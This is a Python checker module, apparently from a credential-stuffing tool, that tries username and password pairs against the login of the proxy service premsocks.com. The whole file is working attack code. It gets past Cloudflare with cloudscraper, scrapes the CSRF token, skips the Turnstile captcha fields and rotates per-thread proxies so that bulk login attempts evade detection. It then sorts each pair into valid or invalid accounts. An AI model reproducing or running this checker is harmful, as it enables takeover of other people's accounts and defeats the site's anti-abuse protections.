"""
Checker for Premsocks (premsocks.com)
Uses traditional form-based login with CSRF token and Cloudflare bypass.
"""
import re
import threading
from typing import Tuple
from urllib.parse import urljoin

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

BASE_URL = "https://premsocks.com"
LOGIN_URL = BASE_URL + "/login"
TIMEOUT = 30

def check(username: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    if HAS_CLOUDSCRAPER:
        session = cloudscraper.create_scraper()
    else:
        import requests
        session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": LOGIN_URL,
    })

    try:
        # Step 1: GET login page to extract CSRF token and hidden fields
        resp = session.get(LOGIN_URL, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        html = resp.text

        # Extract the CSRF token from the hidden input with name "_token"
        token_match = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', html, re.I)
        csrf_token = token_match.group(1) if token_match else ""

        # Build payload
        payload = {
            "username": username,
            "password": password,
            "_token": csrf_token,
            "ctoken": "",    # left empty; may be set by turnstile, but we'll try without
            "fp_dd": "",
            "fp_dd_json": "",
            "fp": "",
        }

        # Step 2: POST credentials (the form action is the same URL)
        post_resp = session.post(LOGIN_URL, data=payload, allow_redirects=True, timeout=TIMEOUT)

        # Step 3: Check for success indicators in the final page
        final_html = post_resp.text.lower()
        final_url = post_resp.url.lower()

        # Success: presence of logout link or user panel
        if "logout" in final_html or 'id="user"' in final_html:
            return True, "Login successful"

        # If we're redirected to the socks list page, also success
        if "socks-proxy" in final_url:
            return True, "Login successful (redirected to socks list)"

        # Check for error messages
        if "invalid" in final_html or "incorrect" in final_html:
            return False, "Invalid credentials"

        # If we are still on the login page with the login form
        if 'name="username"' in final_html and 'name="password"' in final_html:
            return False, "Login failed – still on login page"

        # Fallback: if we don't see the login form but also no logout, treat as unknown
        return False, "Login failed – unknown response"

    except Exception as e:
        return False, f"Request error: {str(e)}"